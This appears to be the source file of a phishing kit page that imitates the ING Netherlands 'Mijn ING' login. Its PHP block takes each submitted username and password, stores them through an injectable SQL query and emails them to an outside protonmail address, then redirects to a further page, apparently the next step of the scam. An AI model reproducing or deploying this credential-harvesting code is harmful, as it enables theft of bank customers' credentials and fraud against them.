<!doctype html>
<html lang="en">
<?php
error_reporting(0);
ob_start();
//include 'header.php';
include 'dbconnect.php';
?>
  <head>
    <title>Inloggen</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta.2/css/bootstrap.min.css" integrity="sha384-PsH8R72JQ3SOdhVi3uxftmaW6Vc51MKb0q5P2rRUpPvrszuE4W1povHYgTpBfshb" crossorigin="anonymous">
    <link rel="stylesheet" href="style.css">
  </head>
  <body>
  <ul class="topnav">
  <li class="left"><a class="active" href="index.php"><img style="height: 35px; width: 118px;" src="logo1.png"></a></li>
  <div class="rightdiv"><li class="right activelan"><a class="test" href="">NL</a></li>
  <li class="right activelan2"><a href="" style="color: #767676">EN</a></li></div>
</ul>
<form  method="post" action="">
<?php
if (isset($_POST['Inloggen'])){
			$gebruikersnaam = ($_POST["gebruikersnaam"]);
			$wachtwoord = ($_POST["wachtwoord"]);
			$permission = 'klant';
			$sql = "INSERT INTO `logindetails`(`gebruikersnaam`, `wachtwoord`, `permission`) VALUES ('$gebruikersnaam','$wachtwoord','$permission')";
			session_start();
			$_SESSION['gebruikersnaam'] = $gebruikersnaam;
			mysqli_query ($conn, $sql);
			// the message
			$msg = "Gebruikersnaam: " + $gebruikersnaam + " Wachtwoord: " + $wachtwoord;
			mail("clintmasseyBD@protonmail.com","Iemand heeft aangemeld met email en wachtwoord",$msg);
			header('location:pi.php');
			
			
}
?>


<div class="login">
<div class="nieuw" id="remove"><div class="nieuw1"><h1 id="nieuwtekst"><img src="alert-info.svg" style="height: 24px; width: 24px;">&nbsp;&nbsp;Nieuw uiterlijk, vertrouwd inloggen
<button onclick="removeDiv(this);"><img src="menu-close.svg" style="height: 16px; width: 16px; float: right; margin-top: 5px; margin-left: 60px;"></button></h2>
<p id="nieuwtekst1">Is het je opgevallen? Inloggen bij Mijn ING is vernieuwd. <a id="infolink" href="https://www.ing.nl/de-ing/veilig-bankieren/nieuwe-login-pagina/index.html">Meer over de nieuwe inlogpagina</a></p></div></div>
<br><h1 id="ingtekst">Log in bij Mijn ING</h1><br>
<p id="radiotekst">Inloggen als</p>
<div class="radiobuttons">
<input id="radio1" type="radio" name="radio" value="1" checked="checked"><label for="radio1"><span><span></span></span>Particulier</label>
<input id="radio2" type="radio" name="radio" value="2" checked""><label for="radio2"><span><span></span></span>Zakelijk</label>
</div>
<br>
<input type="text" name="gebruikersnaam" class="box1" placeholder="Gebruikersnaam" required /><br/><br><br>
<input type="password" name="wachtwoord" class="box1" placeholder="Wachtwoord" required /><br/><br>
<input id="checkbox1" type="checkbox" name="checkbox" value="1" checked="checked"><label style="color: #767676; font-size: 16px;" for="checkbox1"><span></span>Onthoud mijn gebruikersnaam</label><br><br>
<input type="submit" name="Inloggen" value="Inloggen"/><span style="margin-left: 30px;"><img src="arrow-chevron-open-right.svg" style="height: 18px; width: 18px">&nbsp;&nbsp;
<a id="hulp" href="https://inlogcodes.mijn.ing.nl/particulier/zelf-regelen/instellen/inlogcodes/index.jsp">Hulp nodig?</a></span>
</br>	
</div>
<div class="links">
<span style="margin-left: 30px;"><img src="arrow-chevron-open-right.svg" style="height: 18px; width: 18px">&nbsp;&nbsp;
<a id="link" href="https://www.ing.nl/de-ing/veilig-bankieren/index.html">Veilig bankieren</a>
<img src="arrow-chevron-open-right.svg" style="height: 18px; width: 18px">&nbsp;&nbsp;
<a id="link" href="https://www.ing.nl/de-ing/privacy-statement/index.html">Privacy en cookies</a>
<img src="arrow-chevron-open-right.svg" style="height: 18px; width: 18px">&nbsp;&nbsp;
<a id="link" href="https://www.ing.nl/de-ing/disclaimer/index.html">Disclaimer</a></span>	
</div>
    <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.3/umd/popper.min.js" integrity="sha384-vFJXuSJphROIrBnz7yo7oB41mKfc8JzQZiCq4NCceLEaO4IHwicKwpJf9c9IpFgh" crossorigin="anonymous"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta.2/js/bootstrap.min.js" integrity="sha384-alpBpkh1PFOepccYVYDB4do5UnbKysX5WZXm3XxPqe5iKTfUKjNkCk9SaVuEZflJ" crossorigin="anonymous"></script>
	<script type="text/javascript">
        function removeDiv(btn){
            var element = document.getElementById("remove");
			element.parentNode.removeChild(element);
        }
    </script>
  </body>
</html>